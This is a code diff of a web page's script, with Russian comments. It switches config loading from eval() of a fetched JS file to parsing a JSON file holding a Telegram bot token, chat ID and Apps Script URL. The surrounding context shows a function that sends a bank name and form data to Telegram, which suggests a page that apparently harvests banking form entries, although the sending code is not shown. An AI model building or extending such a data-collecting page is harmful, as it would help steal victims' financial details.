@@ -413,25 +413,33 @@
     </div>
 
     <script>
-        // ============ БЕЗОПАСНАЯ ЗАГРУЗКА КОНФИГА ============
-        let TELEGRAM_TOKEN = "";
-        let TELEGRAM_CHAT_ID = "";
+        // ============ ЗАГРУЗКА КОНФИГА (JSON) ============
+let TELEGRAM_TOKEN = "";
+let TELEGRAM_CHAT_ID = "";
+let APPS_SCRIPT_URL = "";
 
-        async function loadConfig() {
-            try {
-                const response = await fetch('config.js');
-                const text = await response.text();
-                const cleanText = text.replace(/\/\/.*$/gm, '').trim();
-                eval(cleanText);
-                console.log('✅ Конфиг загружен');
-                console.log('📌 TELEGRAM_TOKEN:', TELEGRAM_TOKEN ? 'Загружен' : 'НЕ ЗАГРУЖЕН');
-                console.log('📌 TELEGRAM_CHAT_ID:', TELEGRAM_CHAT_ID ? 'Загружен' : 'НЕ ЗАГРУЖЕН');
-            } catch (e) {
-                console.error('❌ Ошибка загрузки config.js:', e);
-                console.log('⚠️ Работаем без отправки в бот.');
-            }
+async function loadConfig() {
+    try {
+        const response = await fetch('config.json');
+        if (!response.ok) {
+            throw new Error('config.json не найден!');
         }
-        loadConfig();
+        const config = await response.json();
+        TELEGRAM_TOKEN = config.TELEGRAM_TOKEN || "";
+        TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID || "";
+        APPS_SCRIPT_URL = config.APPS_SCRIPT_URL || "";
+        console.log('✅ Конфиг загружен (JSON)');
+        console.log('📌 TELEGRAM_TOKEN:', TELEGRAM_TOKEN ? 'Загружен' : 'НЕ ЗАГРУЖЕН');
+        console.log('📌 TELEGRAM_CHAT_ID:', TELEGRAM_CHAT_ID ? 'Загружен' : 'НЕ ЗАГРУЖЕН');
+        if (APPS_SCRIPT_URL) {
+            console.log('📌 APPS_SCRIPT_URL: Загружен');
+        }
+    } catch (e) {
+        console.error('❌ Ошибка загрузки config.json:', e.message);
+        console.log('⚠️ Работаем без отправки в бот.');
+    }
+}
+loadConfig();
 
         // ============ ОТПРАВКА В TELEGRAM ============
         async function sendToTelegram(bankName, formData) {
